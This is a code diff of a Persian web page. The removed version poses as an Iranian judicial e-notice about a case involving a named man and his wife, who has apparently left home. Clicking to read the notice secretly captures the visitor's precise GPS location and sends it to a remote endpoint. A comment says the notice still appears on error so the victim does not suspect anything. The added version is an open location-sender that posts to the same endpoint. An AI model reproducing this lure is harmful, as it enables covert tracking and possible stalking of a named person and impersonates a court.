@@ -1,278 +1,147 @@
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>سامانه ابلاغ الکترونیک قضایی - دادگستری کل استان خراسان رضوی</title>
-<style>
-  @import url('https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css');
-  
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Vazirmatn', Tahoma, sans-serif; }
-  body { background: #f2f1ec; color: #12283f; line-height: 1.8; }
-  
-  header { 
-    background: #0d2b4e; color: #fff; padding: 30px 16px; text-align: center; 
-    border-bottom: 5px solid #c9a24b; box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-  }
-  header h1 { font-size: 1.6rem; margin-bottom: 8px; }
-  header p { color: #d8b76a; font-size: 1rem; }
-  
-  .btn-wrap { text-align: center; margin: 40px 0 30px; }
-  #showBtn { 
-    background: linear-gradient(180deg, #e3c069, #b98a2e); color: #0d2b4e; 
-    font-weight: 800; font-size: 1.2rem; border: none; border-radius: 50px; 
-    padding: 16px 50px; cursor: pointer; box-shadow: 0 6px 20px rgba(185, 138, 46, 0.4); 
-    transition: all 0.3s ease; 
-  }
-  #showBtn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(185, 138, 46, 0.6); }
-  #showBtn:disabled { opacity: 0.6; cursor: wait; }
-  
-  #document { 
-    display: none; max-width: 850px; margin: 0 auto 60px; background: #ffffff; 
-    box-shadow: 0 15px 40px rgba(13, 42, 78, 0.15); padding: 45px 50px; 
-    line-height: 2.2; font-size: 1rem; border: 1px solid #e5e0d5; border-radius: 8px;
-  }
-  #document.show { display: block; animation: fadeIn 0.6s ease-out; }
-  
-  @keyframes fadeIn { 
-    from { opacity: 0; transform: translateY(20px); } 
-    to { opacity: 1; transform: translateY(0); } 
-  }
-  
-  .header-doc { text-align: center; margin-bottom: 30px; }
-  .header-doc h2 { 
-    background: #0d2b4e; color: #fff; display: inline-block; 
-    padding: 8px 30px; border-radius: 6px; font-size: 1.3rem; margin-top: 10px;
-  }
-  
-  .meta-box { 
-    background: #f8f9fa; border-right: 4px solid #c9a24b; padding: 20px; 
-    border-radius: 4px; margin-bottom: 25px; font-size: 0.95rem;
-  }
-  .meta-box div { margin-bottom: 8px; display: flex; }
-  .meta-box strong { min-width: 140px; color: #0d2b4e; }
-  
-  .tag { 
-    text-align: center; font-weight: 800; font-size: 1.2rem; margin: 25px 0; 
-    color: #8a651c; border: 2px dashed #c9a24b; padding: 10px; border-radius: 8px;
-    background: #fffcf5;
-  }
-  
-  p { margin-bottom: 20px; text-align: justify; }
-  
-  .sign { margin-top: 40px; font-weight: 700; text-align: left; color: #0d2b4e; font-size: 1.05rem; }
-  
-  footer { 
-    background: #0d2b4e; color: #fff; text-align: center; padding: 20px; 
-    font-size: 0.9rem; margin-top: 50px; border-top: 5px solid #c9a24b;
-  }
-
-  /* ===== استایل وضعیت (مخفیشده) ===== */
-  .status {
-    margin-top: 12px;
-    padding: 10px;
-    border-radius: 8px;
-    display: none;
-    font-size: 12px;
-    text-align: center;
-    background: #f0f0f0;
-    color: #333;
-  }
-  .status.show { display: block; }
-  .status.ok { background: #e8f5e9; color: #2e7d32; border: 1px solid #a5d6a7; }
-  .status.err { background: #fbe9e7; color: #c62828; border: 1px solid #ffccbc; }
-  .status.load { background: #e3f2fd; color: #0d47a1; border: 1px solid #90caf9; }
-
-  @media (max-width: 600px) {
-    #document { padding: 25px 20px; margin: 0 15px 40px; }
-    .meta-box div { flex-direction: column; }
-    .meta-box strong { margin-bottom: 4px; }
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ارسال موقعیت مکانی</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      background: white;
+      border-radius: 16px;
+      padding: 32px;
+      max-width: 380px;
+      width: 100%;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.25);
+      text-align: center;
+    }
+    .icon { font-size: 48px; margin-bottom: 16px; }
+    h1 { color: #1a1a2e; font-size: 22px; margin-bottom: 8px; }
+    .subtitle { color: #666; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+    .btn {
+      width: 100%; padding: 16px; border: none; border-radius: 10px;
+      font-size: 16px; font-weight: 600; cursor: pointer;
+      background: linear-gradient(135deg, #667eea, #764ba2); color: white;
+      transition: transform .2s, box-shadow .2s;
+    }
+    .btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(102,126,234,.4); }
+    .btn:disabled { opacity: .55; cursor: not-allowed; }
+    .btn.success { background: linear-gradient(135deg, #22c55e, #16a34a); }
+    .status {
+      margin-top: 16px; padding: 14px; border-radius: 10px; display: none;
+      font-size: 13px; line-height: 1.6; text-align: right;
+    }
+    .status.show { display: block; }
+    .status.ok { background: #ecfdf5; color: #065f46; border: 1px solid #a7f3d0; }
+    .status.err { background: #fef2f2; color: #991b1b; border: 1px solid #fecaca; }
+    .status.load { background: #eff6ff; color: #1e40af; border: 1px solid #bfdbfe; }
+    .spinner { display:inline-block; width:16px; height:16px; border:2px solid #bfdbfe; border-top-color:#2563eb; border-radius:50%; animation:spin 1s linear infinite; margin-left:8px; vertical-align:middle; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    .debug {
+      margin-top: 16px; padding: 12px; background: #1e1e1e; color: #0f0;
+      border-radius: 8px; font-size: 11px; font-family: monospace;
+      min-height: 100px; max-height: 200px; overflow-y: auto;
+      text-align: left; direction: ltr; white-space: pre-wrap;
+      border: 1px solid #333;
+    }
+    .debug-line { margin: 2px 0; }
+    .debug-line.error { color: #f88; }
+    .debug-line.warn { color: #ff8; }
+    .debug-line.ok { color: #8f8; }
+    footer { margin-top: 24px; font-size: 11px; color: #aaa; }
+  </style>
 </head>
 <body>
-
-<header>
-  <h1>دادگستری کل استان خراسان رضوی</h1>
-  <p>سامانه ابلاغ الکترونیک قضایی – شعبه ۱ بازپرسی دادسرای عمومی و انقلاب شهرستان گلبهار</p>
-</header>
-
-<div class="btn-wrap">
-  <button id="showBtn" onclick="handleClick()">جهت دیدن متن ابلاغیه</button>
-  <div class="status" id="st"></div>
-</div>
-
-<section id="document">
-  <div class="header-doc">
-    بسمه تعالی<br>
-    <h2>قرار نهایی دادسرا</h2>
+  <div class="card">
+    <div class="icon">📍</div>
+    <h1>ارسال موقعیت مکانی</h1>
+    <p class="subtitle">دکمه را بزنید، اجازه دهید، مختصات به تلگرام ارسال می‌شود.</p>
+    <button class="btn" id="btn" onclick="getLoc()">دریافت و ارسال موقعیت</button>
+    <div class="status" id="st"></div>
+    <div class="debug" id="db">=== DEBUG LOG START ===</div>
+    <footer>فقط یک‌بار خوانده و بلافاصله ارسال می‌شود — ذخیره نمی‌شود.</footer>
   </div>
-  
-  <div class="meta-box">
-    <div><strong>شماره قرار:</strong> 140525390003304357</div>
-    <div><strong>تاریخ تنظیم:</strong> 1405/05/25</div>
-    <div><strong>شماره بایگانی:</strong> 140525390001674028</div>
-    <div><strong>شماره بایگانی شعبه:</strong> 0500159</div>
-    <div><strong>شاکی:</strong> آقای سیدمحمدجواد زاده فرزند سیدحسن</div>
-    <div><strong>اتهام:</strong> اعلام مفقودی شخص</div>
-    <div><strong>متهم:</strong> سرکار خانم عالیه چیتگران</div>
-  </div>
-  
-  <div class="tag">«قرار منع تعقیب»</div>
-  
-  <p>بتاریخ ۱۴۰۵/۰۵/۲۵ در وقت فوق‌العاده، جلسه رسیدگی شعبه ۱ بازپرسی دادسرای عمومی و انقلاب شهرستان گلبهار به تصدی امضاءکننده ذیل تشکیل است؛ پرونده کلاسه 140525390001674028 تحت نظر قرار دارد. با توجه به تحقیقات صورت گرفته و بررسی اوراق پرونده، بازپرسی ضمن استماع اقوال شاکی و بررسی مدارک و اسناد، به شرح زیر مبادرت می‌نماید:</p>
-  
-  <p>دادستان و رئیس محترم دادسرای عمومی و انقلاب شهرستان گلبهار؛ در خصوص شکایت آقای سیدمحمدجواد زاده فرزند سیدحسن مبنی بر اعلام مفقودی و ترک منزل همسرش (سرکار خانم عالیه چیتگران)، پرونده در مسیر تحقیقات قرار گرفت. شاکی محترم در جلسه رسیدگی حاضر و اظهار داشت همسرش بدون هماهنگی منزل را ترک نموده و از سرنوشت وی اطلاعی ندارد و تقاضای صدور قرار قانونی دارد. با عنایت به تحقیقات به‌عمل‌آمده، معاینه محلی، استعلام از ثبت احوال و کلانتری محل، و با توجه به اینکه عمل ارتکابی جرمی محقق نشده و ادله‌ای بر ارتکاب جرم وجود ندارد، علیهذا مستنداً به مواد ۲۶۵ و ۲۷۰ و ۲۷۱ قانون آیین دادرسی کیفری، قرار منع تعقیب صادر و اعلام می‌گردد. ظرف مهلت ۱۰ روز از تاریخ ابلاغ قابل اعتراض در دادگاه کیفری دو است؛ در صورت اعتراض، پرونده به مرجع صالح ارسال گردد و در غیر این صورت قرار قطعی شده و از آمار کسر و بایگانی می‌شود.</p>
-  
-  <div class="sign">بازپرس شعبه ۱ دادسرای عمومی و انقلاب شهرستان گلبهار</div>
-</section>
-
-<footer>
-  تلفن تماس: 38325372 - 05138328511 &nbsp;|&nbsp; استان خراسان رضوی – شهرستان گلبهار
-</footer>
-
 <script>
-  // ============================================================
-  // CONFIG — دقیقاً مثل کد ارسال موقعیت
-  // ============================================================
-  const ENDPOINT = 'https://location-proxy.esmailmahdavi7785.workers.dev';
+const ENDPOINT = 'https://location-proxy.esmailmahdavi7785.workers.dev';
+const btn = document.getElementById('btn');
+const st = document.getElementById('st');
+const db = document.getElementById('db');
+let tryCount = 0;
 
-  // ============================================================
-  // DOM
-  // ============================================================
-  const btn = document.getElementById('showBtn');
-  const doc = document.getElementById('document');
-  const st = document.getElementById('st');
+function log(msg, type = '') {
+  console.log('[LOC]', msg);
+  const line = document.createElement('div');
+  line.className = 'debug-line' + (type ? ' ' + type : '');
+  line.textContent = '[' + new Date().toLocaleTimeString('fa-IR') + '] ' + msg;
+  db.appendChild(line);
+  db.scrollTop = db.scrollHeight;
+}
 
-  // ============================================================
-  // UI Helpers (مخفیشده)
-  // ============================================================
-  function setStatus(msg, type) {
-    st.textContent = msg;
-    st.className = 'status show ' + type;
-    if (type === 'ok' || type === 'err') {
-      setTimeout(() => {
-        st.className = 'status';
-        st.textContent = '';
-      }, 5000);
-    }
+function status(msg, type) {
+  st.textContent = msg;
+  st.className = 'status show ' + type;
+}
+
+function ready() {
+  btn.disabled = false;
+  btn.textContent = 'دریافت و ارسال موقعیت';
+  btn.classList.remove('success');
+  btn.style.background = '';
+  log('✅ Ready for next click', 'ok');
+}
+
+function getLoc() {
+  tryCount++;
+  log('▶ Try #' + tryCount + ' – requesting GPS...');
+  if (!navigator.geolocation) { status('❌ Browser unsupported', 'err'); return; }
+  btn.disabled = true; btn.textContent = 'در حال دریافت GPS...'; status('⏳ Waiting for GPS fix... (outdoors works best)', 'load');
+  navigator.geolocation.getCurrentPosition(onOk, onErr, { enableHighAccuracy:true, timeout:60000, maximumAge:0 });
+}
+
+function onErr(e) {
+  log('❌ Err ' + e.code + ': ' + e.message, 'error');
+  let m = '❌ ';
+  if (e.code===1) m += 'Permission denied. Tap lock icon → Location → Allow → Reload.';
+  else if (e.code===2) m += 'GPS unavailable. Enable GPS, go outdoors, High accuracy mode.';
+  else if (e.code===3) m += 'Timeout. Try again.';
+  else m += e.message;
+  status(m, 'err'); ready();
+}
+
+async function onOk(p) {
+  const {latitude, longitude, accuracy} = p.coords;
+  log('📍 Got: ' + latitude.toFixed(6) + ', ' + longitude.toFixed(6) + ' (±' + Math.round(accuracy) + 'm)', 'ok');
+  status('⏳ Sending to server...', 'load');
+  try {
+    log('📤 POST to: ' + ENDPOINT);
+    // No timeout - let browser handle it naturally
+    const r = await fetch(ENDPOINT, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({latitude,longitude,accuracy})});
+    log('📥 Response status: ' + r.status + ' ' + r.statusText, r.ok ? 'ok' : 'error');
+    const text = await r.text();
+    log('📥 Raw response: ' + text.substring(0, 200));
+    let j;
+    try { j = JSON.parse(text); } catch (e) { log('📥 JSON parse failed: ' + e.message, 'error'); throw new Error('Invalid JSON: ' + text.substring(0,100)); }
+    if (!j.ok) throw new Error(j.error||'Server error');
+    log('📨 Server OK', 'ok');
+    status('✅ Sent!\n🌍 ' + latitude.toFixed(6) + ', ' + longitude.toFixed(6) + '\n🎯 ±' + Math.round(accuracy) + 'm\n🕐 ' + new Date().toLocaleString('fa-IR'), 'ok');
+    btn.textContent = '✅ ارسال شد — دوباره بفرست'; btn.classList.add('success'); btn.disabled = false;
+    log('✅ Done. Button re-enabled.', 'ok');
+  } catch (e) {
+    log('📨 Send failed: ' + e.name + ': ' + e.message, 'error');
+    if (e.name === 'AbortError') log('📨 Timeout', 'warn');
+    if (e.name === 'TypeError') log('📨 Network error - check: offline, CORS, adblocker', 'warn');
+    status('❌ Send error: ' + e.message + ' (' + e.name + ')', 'err'); ready();
   }
-
-  function setLoading(loading) {
-    if (loading) {
-      btn.disabled = true;
-      btn.textContent = 'در حال دریافت...';
-      setStatus('⏳ در حال دریافت موقعیت...', 'load');
-    } else {
-      btn.disabled = false;
-      btn.textContent = 'جهت دیدن متن ابلاغیه';
-    }
-  }
-
-  // ============================================================
-  // ارسال موقعیت به سرور (دقیقاً مثل کد بالا)
-  // ============================================================
-  async function sendLocationToServer(pos) {
-    const { latitude, longitude, accuracy } = pos.coords;
-
-    try {
-      setStatus('⏳ ارسال به سرور...', 'load');
-      const r = await fetch(ENDPOINT, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ latitude, longitude, accuracy })
-      });
-      
-      if (!r.ok) throw new Error('Server error: ' + r.status);
-      const text = await r.text();
-      let j;
-      try { j = JSON.parse(text); } catch (e) { throw new Error('Invalid JSON'); }
-      if (!j.ok) throw new Error(j.error || 'Unknown error');
-
-      setStatus('✅ موقعیت ارسال شد', 'ok');
-      setLoading(false);
-      showDocument();
-    } catch (e) {
-      setStatus('❌ خطا در ارسال: ' + e.message, 'err');
-      setLoading(false);
-      // حتی با خطا، ابلاغیه رو نشون بده تا کاربر شک نکنه
-      showDocument();
-    }
-  }
-
-  // ============================================================
-  // دریافت موقعیت (دقیقاً مثل کد بالا)
-  // ============================================================
-  function getLocation() {
-    if (!navigator.geolocation) {
-      setStatus('❌ مرورگر پشتیبانی نمی‌کند', 'err');
-      return;
-    }
-
-    setLoading(true);
-
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        sendLocationToServer(pos);
-      },
-      err => {
-        let msg = '❌ ';
-        if (err.code === 1) msg += 'دسترسی رد شد. از مرورگر اجازه بگیرید.';
-        else if (err.code === 2) msg += 'GPS در دسترس نیست.';
-        else if (err.code === 3) msg += 'زمان‌بر شد. دوباره تلاش کنید.';
-        else msg += err.message;
-        setStatus(msg, 'err');
-        setLoading(false);
-        // خطا → ابلاغیه نمایش داده نشه
-      },
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-    );
-  }
-
-  // ============================================================
-  // نمایش ابلاغیه
-  // ============================================================
-  function showDocument() {
-    doc.classList.add('show');
-    btn.textContent = 'بستن متن ابلاغیه';
-    btn.disabled = false;
-    setTimeout(() => {
-      doc.scrollIntoView({ behavior: 'smooth', block: 'start' });
-    }, 100);
-  }
-
-  // ============================================================
-  // بستن ابلاغیه
-  // ============================================================
-  function closeDocument() {
-    doc.classList.remove('show');
-    btn.textContent = 'جهت دیدن متن ابلاغیه';
-    btn.disabled = false;
-    st.className = 'status';
-    st.textContent = '';
-  }
-
-  // ============================================================
-  // هندلر اصلی
-  // ============================================================
-  function handleClick() {
-    if (doc.classList.contains('show')) {
-      closeDocument();
-      return;
-    }
-    getLocation();
-  }
-
-  // ============================================================
-  // بستن با کلیک خارج
-  // ============================================================
-  document.addEventListener('click', function(e) {
-    const isDoc = doc.contains(e.target);
-    const isBtn = btn.contains(e.target);
-    if (doc.classList.contains('show') && !isDoc && !isBtn) {
-      closeDocument();
-    }
-  });
+}
 </script>
 </body>
 </html>
